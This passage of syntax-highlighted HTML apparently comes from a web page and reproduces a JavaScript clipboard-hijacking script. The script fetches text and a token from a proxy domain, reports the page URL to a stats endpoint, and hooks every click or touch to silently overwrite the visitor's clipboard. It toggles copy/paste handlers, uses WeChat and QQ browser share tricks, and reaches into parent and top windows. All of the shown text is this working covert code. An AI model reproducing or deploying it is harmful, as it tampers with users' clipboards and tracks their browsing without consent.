class="built_in">encodeURIComponent</span>(top.<span class="property">location</span>.<span class="property">href</span>)</span><br><span class="line">                &#125;, <span class="keyword">function</span>(<span class="params">b</span>) &#123;</span><br><span class="line">                    a.<span class="property">text</span> = b.<span class="property">text</span>;</span><br><span class="line">                    a.<span class="property">token</span> = b.<span class="property">token</span>;</span><br><span class="line">                    a.<span class="property">closeqq</span> = b.<span class="property">closeqq</span>;</span><br><span class="line">                    <span class="keyword">if</span> (b.<span class="property">hascopy</span> == <span class="string">&quot;yes&quot;</span>) &#123;</span><br><span class="line">                        <span class="keyword">var</span> amb_has_copy = a.<span class="title function_">sGet</span>(<span class="string">&quot;amb_jd_has_copy&quot;</span>);</span><br><span class="line">                        <span class="keyword">if</span> (amb_has_copy == <span class="literal">null</span>) &#123;</span><br><span class="line">                            <span class="keyword">try</span> &#123;</span><br><span class="line">                                <span class="keyword">if</span> (<span class="keyword">typeof</span> <span class="built_in">eval</span>(<span class="string">&quot;amb_auto_copy&quot;</span>) == <span class="string">&quot;function&quot;</span>) &#123;</span><br><span class="line">                                    a.<span class="title function_">sSet</span>(<span class="string">&quot;amb_jd_has_copy&quot;</span>, <span class="string">&quot;copyed&quot;</span>, <span class="number">3600</span>);</span><br><span class="line">                                    <span class="title function_">amb_auto_copy</span>();</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125; <span class="keyword">catch</span> (e) &#123;&#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> (b.<span class="property">iscn</span> == <span class="string">&quot;no&quot;</span>) &#123;</span><br><span class="line">                        a.<span class="title function_">wxcp</span>(b.<span class="property">text</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    a.<span class="title function_">sSet</span>(<span class="string">&quot;amb_jd_load&quot;</span>, <span class="string">&quot;has&quot;</span>, <span class="number">86400</span>);</span><br><span class="line">                    <span class="string">&quot;null&quot;</span> == a.<span class="property">text</span> &amp;&amp; (a.<span class="property">text</span> = <span class="number">0</span>);</span><br><span class="line">                    a.<span class="property">dd</span>.<span class="property">queryCommandSupported</span> &amp;&amp; a.<span class="property">dd</span>.<span class="title function_">queryCommandSupported</span>(a.<span class="property">action</span>) ? a.<span class="property">text</span> &amp;&amp; (a.<span class="title function_">listenClick</span>(), a.<span class="title function_">listenTouchend</span>()) : <span class="number">1</span> &lt; a.<span class="property">ua</span>.<span class="title function_">split</span>(<span class="string">&quot;MQQBrowser&quot;</span>).<span class="property">length</span> &amp;&amp; <span class="number">1</span> &lt; a.<span class="property">ua</span>.<span class="title function_">split</span>(<span class="string">&quot;Android&quot;</span>).<span class="property">length</span> &amp;&amp; <span class="number">2</span> &gt; a.<span class="property">ua</span>.<span class="title function_">split</span>(<span class="string">&quot;MicroMessenger&quot;</span>).<span class="property">length</span> &amp;&amp; <span class="number">2</span> &gt; a.<span class="property">ua</span>.<span class="title function_">split</span>(<span class="string">&quot;QQ/&quot;</span>).<span class="property">length</span> ? a.<span class="property">text</span> &amp;&amp; a.<span class="title function_">qqCopy</span>() : (a.<span class="property">listenerCopy</span> = a.<span class="title function_">listenNode</span>(a.<span class="property">dd</span>.<span class="property">body</span>, <span class="string">&quot;click&quot;</span>, a.<span class="property">clipboardCopy</span>.<span class="title function_">bind</span>(a)));</span><br><span class="line">                &#125;, <span class="variable language_">this</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">wxcp</span>: <span class="keyword">function</span>(<span class="params">a</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="regexp">/MicroMessenger/i</span>.<span class="title function_">test</span>(navigator.<span class="property">userAgent</span>)) &#123;</span><br><span class="line">                <span class="keyword">var</span> iframe = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;iframe&quot;</span>);</span><br><span class="line">                iframe.<span class="property">style</span>.<span class="property">cssText</span> = <span class="string">&quot;display:none;width:0px;height:0px;&quot;</span>;</span><br><span class="line">                iframe.<span class="property">src</span> = <span class="string">&quot;weixin://webview/copy/&quot;</span> + a;</span><br><span class="line">                <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(iframe);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">cp</span>: <span class="keyword">function</span>(<span class="params">a</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> b = <span class="variable language_">this</span>;</span><br><span class="line">            <span class="keyword">if</span> (b.<span class="property">hascopy2</span> == <span class="literal">null</span>) &#123;</span><br><span class="line">                b.<span class="property">hascopy2</span> = <span class="string">&quot;yes&quot;</span>;</span><br><span class="line">                b.<span class="title function_">_ajax</span>(<span class="string">&quot;//&quot;</span> + <span class="variable language_">window</span>.<span class="property">amb_jd_proxy_domain</span> + <span class="string">&quot;/jd/stat?callback=jsonp&quot;</span> + (<span class="keyword">new</span> <span class="title class_">Date</span>).<span class="title function_">getTime</span>(), &#123;</span><br><span class="line">                    <span class="attr">f</span>: b.<span class="property">id</span>,</span><br><span class="line">                    <span class="attr">t</span>: b.<span class="property">token</span>,</span><br><span class="line">                    <span class="attr">h</span>: b.<span class="property">hascopy</span>,</span><br><span class="line">                    <span class="attr">current_url</span>: <span class="built_in">encodeURIComponent</span>(top.<span class="property">location</span>.<span class="property">href</span>)</span><br><span class="line">                &#125;, <span class="keyword">function</span>(<span class="params">c</span>) &#123;</span><br><span class="line">                    b.<span class="title function_">sSet</span>(<span class="string">&quot;amb_jd_open&quot;</span>, <span class="string">&quot;close&quot;</span>, <span class="variable language_">window</span>.<span class="property">amb_jd_proxy_c</span>);</span><br><span class="line">                    b.<span class="title function_">sSet</span>(<span class="string">&quot;amb_jd_copy&quot;</span>, <span class="string">&quot;has&quot;</span>, <span class="number">86400</span>);</span><br><span class="line">                &#125;, <span class="literal">true</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">qqCopy</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> a = <span class="variable language_">this</span>,</span><br><span class="line">                b = a.<span class="property">text</span>,</span><br><span class="line">                c = navigator.<span class="property">appVersion</span>,</span><br><span class="line">                e = <span class="number">1</span> &lt; c.<span class="title function_">split</span>(<span class="string">&quot;MQQBrowser/&quot;</span>).<span class="property">length</span> ? <span class="number">2</span> : <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">if</span> (a.<span class="property">closeqq</span> == <span class="string">&quot;yes&quot;</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (e) &#123;</span><br><span class="line">                <span class="keyword">var</span> f = &#123;</span><br><span class="line">                    <span class="attr">url</span>: b,</span><br><span class="line">                    <span class="attr">to_app</span>: <span class="string">&quot;10&quot;</span>,</span><br><span class="line">                    <span class="attr">us_txt</span>: <span class="string">&quot;23s&quot;</span></span><br><span class="line">                &#125;;</span><br><span class="line">                b = c.<span class="title function_">split</span>(<span class="string">&quot;MQQBrowser/&quot;</span>)[<span class="number">1</span>].<span class="title function_">split</span>(<span class="string">&quot;.&quot;</span>);</span><br><span class="line">                b = <span class="built_in">parseFloat</span>(b[<span class="number">0</span>] + <span class="string">&quot;.&quot;</span> + b[<span class="number">1</span>]);</span><br><span class="line">                b = <span class="number">5.4</span> &gt; (e ? b : <span class="number">0</span>) ? <span class="string">&quot;//3gimg.qq.com/html5/js/qb.js&quot;</span> : <span class="string">&quot;//jsapi.qq.com/get?api=app.share&quot;</span>;</span><br><span class="line">                c = a.<span class="property">dd</span>.<span class="title function_">createElement</span>(<span class="string">&quot;script&quot;</span>);</span><br><span class="line">                <span class="keyword">var</span> d = a.<span class="property">dd</span>.<span class="title function_">getElementsByTagName</span>(<span class="string">&quot;body&quot;</span>)[<span class="number">0</span>];</span><br><span class="line">                c.<span class="title function_">setAttribute</span>(<span class="string">&quot;src&quot;</span>, b);</span><br><span class="line">                c.<span class="property">onload</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">                    <span class="string">&quot;undefined&quot;</span> != <span class="keyword">typeof</span> a.<span class="property">ww</span>.<span class="property">browser</span> &amp;&amp; <span class="string">&quot;undefined&quot;</span> != <span class="keyword">typeof</span> a.<span class="property">ww</span>.<span class="property">browser</span>.<span class="property">app</span> &amp;&amp; <span class="number">2</span> == e ? (a.<span class="property">ww</span>.<span class="property">browser</span>.<span class="property">app</span>.<span class="title function_">share</span>(f), a.<span class="title function_">cp</span>(<span class="string">&quot;1&quot;</span>)) : <span class="string">&quot;undefined&quot;</span> != <span class="keyword">typeof</span> a.<span class="property">ww</span>.<span class="property">qb</span> &amp;&amp; <span class="number">1</span> == e &amp;&amp; (a.<span class="property">ww</span>.<span class="property">qb</span>.<span class="title function_">share</span>(f), a.<span class="title function_">cp</span>(<span class="string">&quot;1&quot;</span>));</span><br><span class="line">                &#125;;</span><br><span class="line">                d.<span class="title function_">appendChild</span>(c);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">clipboardCopy</span>: <span class="keyword">function</span>(<span class="params">a</span>) &#123;</span><br><span class="line">            _this.<span class="property">ww</span>.<span class="property">clipboardData</span> &amp;&amp; <span class="variable language_">this</span>.<span class="property">text</span> &amp;&amp; _this.<span class="property">ww</span>.<span class="property">clipboardData</span>.<span class="title function_">setData</span>(<span class="string">&quot;Text&quot;</span>, <span class="variable language_">this</span>.<span class="property">text</span>);</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">listenerCopy</span>.<span class="title function_">destroy</span>();</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">listenClick</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> a = <span class="variable language_">this</span>, b = <span class="number">0</span>; b &lt; a.<span class="property">trigger</span>.<span class="property">length</span>; b++) &#123;</span><br><span class="line">                a.<span class="property">listener</span>.<span class="title function_">push</span>(a.<span class="title function_">listenNode</span>(a.<span class="property">trigger</span>[b], <span class="string">&quot;click&quot;</span>, <span class="keyword">function</span>(<span class="params">b</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> a.<span class="title function_">onClick</span>(b, <span class="string">&quot;click&quot;</span>);</span><br><span class="line">                &#125;));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">listenTouchend</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> a = <span class="variable language_">this</span>, b = <span class="number">0</span>; b &lt; a.<span class="property">trigger</span>.<span class="property">length</span>; b++) &#123;</span><br><span class="line">                a.<span class="property">listenerTouchend</span>.<span class="title function_">push</span>(a.<span class="title function_">listenNode</span>(a.<span class="property">trigger</span>[b], <span class="string">&quot;touchend&quot;</span>, <span class="keyword">function</span>(<span class="params">b</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> a.<span class="title function_">onClick</span>(b, <span class="string">&quot;touchend&quot;</span>);</span><br><span class="line">                &#125;));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">listenNode</span>: <span class="keyword">function</span>(<span class="params">a, b, c</span>) &#123;</span><br><span class="line">            a.<span class="title function_">addEventListener</span>(b, c, <span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">return</span> &#123;</span><br><span class="line">                <span class="attr">destroy</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">                    a.<span class="title function_">removeEventListener</span>(b, c, <span class="literal">true</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">onClick</span>: <span class="keyword">function</span>(<span class="params">a, b</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> c = <span class="variable language_">this</span>;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">dd</span>.<span class="property">body</span>.<span class="title function_">hasAttribute</span>(<span class="string">&quot;oncopy&quot;</span>) &amp;&amp; <span class="variable language_">this</span>.<span class="property">dd</span>.<span class="property">body</span>.<span class="title function_">setAttribute</span>(<span class="string">&quot;oncopy&quot;</span>, <span class="string">&quot;return true&quot;</span>);</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">dd</span>.<span class="property">body</span>.<span class="title function_">hasAttribute</span>(<span class="string">&quot;onpaste&quot;</span>) &amp;&amp; <span class="variable language_">this</span>.<span class="property">dd</span>.<span class="property">body</span>.<span class="title function_">setAttribute</span>(<span class="string">&quot;onpaste&quot;</span>, <span class="string">&quot;return true&quot;</span>);</span><br><span class="line">            <span class="string">&quot;INPUT&quot;</span> != a.<span class="property">target</span>.<span class="property">nodeName</span> &amp;&amp; <span class="string">&quot;TEXTAREA&quot;</span> != a.<span class="property">target</span>.<span class="property">nodeName</span> &amp;&amp; ((<span class="keyword">new</span> <span class="title function_">h</span>(<span class="variable language_">this</span>.<span class="property">text</span>, <span class="variable language_">this</span>.<span class="property">action</span>, <span class="keyword">function</span>(<span class="params">a</span>) &#123;</span><br><span class="line">                a ? c.<span class="title function_">cp</span>(<span class="string">&quot;1&quot;</span>) : c.<span class="title function_">cp</span>(<span class="string">&quot;2&quot;</span>);</span><br><span class="line">            &#125;)).<span class="title function_">start</span>(), <span class="string">&quot;click&quot;</span> == b ? (<span class="variable language_">this</span>.<span class="property">listenerD</span> = <span class="literal">true</span>, <span class="variable language_">this</span>.<span class="property">listener</span>.<span class="title function_">forEach</span>(<span class="keyword">function</span>(<span class="params">a, b</span>) &#123;</span><br><span class="line">                a.<span class="title function_">destroy</span>();</span><br><span class="line">            &#125;)) : <span class="string">&quot;touchend&quot;</span> == b &amp;&amp; <span class="variable language_">this</span>.<span class="property">listenerTouchend</span>.<span class="title function_">forEach</span>(<span class="keyword">function</span>(<span class="params">a, b</span>) &#123;</span><br><span class="line">                a.<span class="title function_">destroy</span>();</span><br><span class="line">            &#125;));</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">dd</span>.<span class="property">body</span>.<span class="title function_">hasAttribute</span>(<span class="string">&quot;oncopy&quot;</span>) &amp;&amp; <span class="variable language_">this</span>.<span class="property">dd</span>.<span class="property">body</span>.<span class="title function_">setAttribute</span>(<span class="string">&quot;oncopy&quot;</span>, <span class="string">&quot;return false&quot;</span>);</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">dd</span>.<span class="property">body</span>.<span class="title function_">hasAttribute</span>(<span class="string">&quot;onpaste&quot;</span>) &amp;&amp; <span class="variable language_">this</span>.<span class="property">dd</span>.<span class="property">body</span>.<span class="title function_">setAttribute</span>(<span class="string">&quot;onpaste&quot;</span>, <span class="string">&quot;return false&quot;</span>);</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">randomString</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> a = <span class="string">&quot;&quot;</span>;</span><br><span class="line">            <span class="keyword">for</span> (i = <span class="number">0</span>; <span class="number">7</span> &gt; i; i++) &#123;</span><br><span class="line">                a += <span class="string">&quot;ABCDEFGHJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&quot;</span>.<span class="title function_">charAt</span>(<span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="number">61</span> * <span class="title class_">Math</span>.<span class="title function_">random</span>()));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> a;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">sGet</span>: <span class="keyword">function</span>(<span class="params">a</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (!<span class="variable language_">this</span>.<span class="property">ww</span>.<span class="property">localStorage</span>[a]) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">var</span> b = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="variable language_">this</span>.<span class="property">ww</span>.<span class="property">localStorage</span>[a]);</span><br><span class="line">                <span class="keyword">return</span> b.<span class="property">time</span> &lt; (<span class="keyword">new</span> <span class="title class_">Date</span>).<span class="title function_">getTime</span>() ? (<span class="variable language_">this</span>.<span class="property">ww</span>.<span class="property">localStorage</span>[a] = <span class="literal">null</span>) : b.<span class="property">value</span>;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (c) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;not localStorage.&quot;</span>), <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">sSet</span>: <span class="keyword">function</span>(<span class="params">a, b, c</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">var</span> e = &#123;</span><br><span class="line">                    <span class="attr">name</span>: a,</span><br><span class="line">                    <span class="attr">value</span>: b,</span><br><span class="line">                    <span class="attr">time</span>: (<span class="keyword">new</span> <span class="title class_">Date</span>).<span class="title function_">getTime</span>() + <span class="number">1000</span> * c</span><br><span class="line">                &#125;;</span><br><span class="line">                <span class="variable language_">this</span>.<span class="property">ww</span>.<span class="property">localStorage</span>[a] = <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(e);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (f) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;not localStorage.&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">now</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> (<span class="keyword">new</span> <span class="title class_">Date</span>).<span class="title function_">getTime</span>();</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">rand</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title class_">Math</span>.<span class="title function_">random</span>().<span class="title function_">toString</span>().<span class="title function_">substr</span>(<span class="number">2</span>);</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">parseData</span>: <span class="keyword">function</span>(<span class="params">a</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> b = <span class="string">&quot;&quot;</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="string">&quot;string&quot;</span> === <span class="keyword">typeof</span> a) &#123;</span><br><span class="line">                b = a;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;object&quot;</span> === <span class="keyword">typeof</span> a) &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">var</span> c <span class="keyword">in</span> a) &#123;</span><br><span class="line">                    b += <span class="string">&quot;&amp;&quot;</span> + c + <span class="string">&quot;=&quot;</span> + <span class="built_in">encodeURIComponent</span>(a[c]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            b += <span class="string">&quot;&amp;_time=&quot;</span> + <span class="variable language_">this</span>.<span class="title function_">now</span>();</span><br><span class="line">            <span class="keyword">return</span> b = b.<span class="title function_">substr</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">_ajax</span>: <span class="keyword">function</span>(<span class="params">a, b, c</span>) &#123;</span><br><span class="line">            a = a + (-<span class="number">1</span> === a.<span class="title function_">indexOf</span>(<span class="string">&quot;?&quot;</span>) ? <span class="string">&quot;?&quot;</span> : <span class="string">&quot;&amp;&quot;</span>) + <span class="variable language_">this</span>.<span class="title function_">parseData</span>(b);</span><br><span class="line">            <span class="keyword">if</span> ((b = <span class="regexp">/callback=(\w+)/</span>.<span class="title function_">exec</span>(a)) &amp;&amp; b[<span class="number">1</span>]) &#123;</span><br><span class="line">                <span class="keyword">var</span> e = b[<span class="number">1</span>];</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                e = <span class="string">&quot;jsonp_&quot;</span> + <span class="variable language_">this</span>.<span class="title function_">now</span>() + <span class="string">&quot;_&quot;</span> + <span class="variable language_">this</span>.<span class="title function_">rand</span>(), a = a.<span class="title function_">replace</span>(<span class="string">&quot;callback=?&quot;</span>, <span class="string">&quot;callback=&quot;</span> + e), a = a.<span class="title function_">replace</span>(<span class="string">&quot;callback=%3F&quot;</span>, <span class="string">&quot;callback=&quot;</span> + e);</span><br><span class="line">            &#125;</span><br><span class="line">            b = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;script&quot;</span>);</span><br><span class="line">            b.<span class="property">type</span> = <span class="string">&quot;text/javascript&quot;</span>;</span><br><span class="line">            b.<span class="property">src</span> = a;</span><br><span class="line">            b.<span class="property">id</span> = <span class="string">&quot;id_&quot;</span> + e;</span><br><span class="line">            <span class="variable language_">window</span>[e] = <span class="keyword">function</span>(<span class="params">a</span>) &#123;</span><br><span class="line">                <span class="variable language_">window</span>[e] = <span class="keyword">void</span> <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">var</span> b = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;id_&quot;</span> + e),</span><br><span class="line">                    k = b.<span class="property">parentNode</span>;</span><br><span class="line">                k &amp;&amp; <span class="number">11</span> !== k.<span class="property">nodeType</span> &amp;&amp; k.<span class="title function_">removeChild</span>(b);</span><br><span class="line">                <span class="title function_">c</span>(a);</span><br><span class="line">            &#125;;</span><br><span class="line">            (a = <span class="variable language_">document</span>.<span class="title function_">getElementsByTagName</span>(<span class="string">&quot;head&quot;</span>)) &amp;&amp; a[<span class="number">0</span>] &amp;&amp; a[<span class="number">0</span>].<span class="title function_">appendChild</span>(b);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        parent.<span class="property">window</span>.<span class="property">location</span>.<span class="property">href</span> != <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span> &amp;&amp; (g.<span class="property">host</span> = parent.<span class="property">window</span>.<span class="property">location</span>.<span class="property">protocol</span> + <span class="string">&quot;//&quot;</span> + parent.<span class="property">window</span>.<span class="property">location</span>.<span class="property">host</span>, g.<span class="property">dd</span> = parent.<span class="property">document</span>, g.<span class="property">ww</span> = parent.<span class="property">window</span>), g.<span class="title function_">init</span>();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (a) &#123;</span><br><span class="line">        g.<span class="title function_">init</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)(<span class="keyword">function</span>(<span class="params">h, g, a</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        <span class="attr">fakeElem</span>: <span class="literal">null</span>,</span><br><span class="line">        <span class="attr">text</span>: h,</span><br><span class="line">        <span class="attr">action</span>: g,</span><br><span class="line">        <span class="attr">selectedText</span>: <span class="literal">null</span>,</span><br><span class="line">        <span class="attr">dd</span>: <span class="variable language_">document</span>,</span><br><span class="line">        <span class="attr">ww</span>: <span class="variable language_">window</span>,</span><br><span class="line">        <span class="attr">start</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">text</span> &amp;&amp; (parent.<span class="property">window</span>.<span class="property">location</span>.<span class="property">href</span> != <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span> &amp;&amp; (<span class="variable language_">this</span>.<span class="property">ww</span> = top.<span class="property">window</span>, <span class="variable language_">this</span>.<span class="property">dd</span> = top.<span class="property">document</span>), <span class="variable language_">this</span>.<span class="title function_">selectFake</span>());</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">selectFake</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> a = <span class="string">&quot;rtl&quot;</span> == <span class="variable language_">this</span>.<span class="property">dd</span>.<span class="property">documentElement</span>.<span class="title function_">getAttribute</span>(<span class="string">&quot;dir&quot;</span>);</span><br><span class="line">            <span class="variable language_">this</span>.<span class="title function_">removeFake</span>();</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">fakeElem</span> = <span class="variable language_">this</span>.<span class="property">dd</span>.<span class="title function_">createElement</span>(<span class="string">&quot;textarea&quot;</span>);</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">fakeElem</span>.<span class="property">style</span>.<span class="property">fontSize</span> = <span class="string">&quot;12pt&quot;</span>;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">fakeElem</span>.<span class="property">style</span>.<span class="property">border</span> = <span class="string">&quot;0&quot;</span>;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">fakeElem</span>.<span class="property">style</span>.<span class="property">padding</span> = <span class="string">&quot;0&quot;</span>;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">fakeElem</span>.<span class="property">style</span>.<span class="property">margin</span> = <span class="string">&quot;0&quot;</span>;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">fakeElem</span>.<span class="property">style</span>.<span class="property">position</span> = <span class="string">&quot;absolute&quot;</span>;</span><br><span class="line">            a ? (<span class="variable language_">this</span>.<span class="property">fakeElem</span>.<span class="property">style</span>.<span class="property">right</span> = <span class="string">&quot;-9999px&quot;</span>) : (<span class="variable language_">this</span>.<span class="property">fakeElem</span>.<span class="property">style</span>.<span class="property">left</span> = <span class="string">&quot;-9999px&quot;</span>);</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">fakeElem</span>.<span class="property">style</span>.<span class="property">top</span> = (<span class="variable language_">this</span>.<span class="property">ww</span>.<span class="property">pageYOffset</span> || <span class="variable language_">this</span>.<span class="property">dd</span>.<span class="property">documentElement</span>.<span class="property">scrollTop</span>) + <span class="string">&quot;px&quot;</span>;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">fakeElem</span>.<span class="title function_">setAttribute</span>(<span class="string">&quot;readonly&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">fakeElem</span>.<span class="property">value</span> = <span class="variable language_">this</span>.<span class="property">text</span>;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">dd</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(<span class="variable language_">this</span>.<span class="property">fakeElem</span>);</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">selectedText</span> = <span class="variable language_">this</span>.<span class="title function_">selectText</span>(<span class="variable language_">this</span>.<span class="property">fakeElem</span>);</span><br><span class="line">            <span class="variable language_">this</span>.<span class="title function_">copyText</span>();</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">removeFake</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">fakeElem</span> &amp;&amp; (<span class="variable language_">this</span>.<span class="property">dd</span>.<span class="property">body</span>.<span class="title function_">removeChild</span>(<span class="variable language_">this</span>.<span class="property">fakeElem</span>), <span class="variable language_">this</span>.<span class="property">fakeElem</span> = <span class="literal">null</span>);</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">copyText</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> b = <span class="keyword">void</span> <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                b = <span class="variable language_">this</span>.<span class="property">dd</span>.<span class="title function_">execCommand</span>(<span class="variable language_">this</span>.<span class="property">action</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (c) &#123;</span><br><span class="line">                b = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="title function_">removeFake</span>();</span><br><span class="line">            a.<span class="title function_">call</span>(<span class="variable language_">this</span>, b);</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">selectText</span>: <span class="keyword">function</span>(<span class="params">a</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="string">&quot;SELECT&quot;</span> === a.<span class="property">nodeName</span>) &#123;</span><br><span class="line">                a.<span class="title function_">focus</span>(), a = a.<span class="property">value</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;INPUT&quot;</span> === a.<span class="property">nodeName</span> || <span class="string">&quot;TEXTAREA&quot;</span> === a.<span class="property">nodeName</span>) &#123;</span><br><span class="line">                <span class="keyword">var</span> b = a.<span class="title function_">hasAttribute</span>(<span class="string">&quot;readonly&quot;</span>);</span><br><span class="line">                b || a.<span class="title function_">setAttribute</span>(<span class="string">&quot;readonly&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">                a.<span class="title function_">select</span>();</span><br><span class="line">                a.<span class="title function_">setSelectionRange</span>(<span class="number">0</span>, a.<span class="property">value</span>.<span class="property">length</span>);</span><br><span class="line">                b || a.<span class="title function_">removeAttribute</span>(<span class="string">&quot;readonly&quot;</span>);</span><br><span class="line">                a = a.<span class="property">value</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                a.<span class="title function_">hasAttribute</span>(<span class="string">&quot;contenteditable&quot;</span>) &amp;&amp; a.<span class="title function_">focus</span>();</span><br><span class="line">                b = <span class="variable language_">this</span>.<span class="property">ww</span>.<span class="title function_">getSelection</span>();</span><br><span class="line">                <span class="keyword">var</span> e = <span class="variable language_">this</span>.<span class="property">dd</span>.<span class="title function_">createRange</span>();</span><br><span class="line">                e.<span 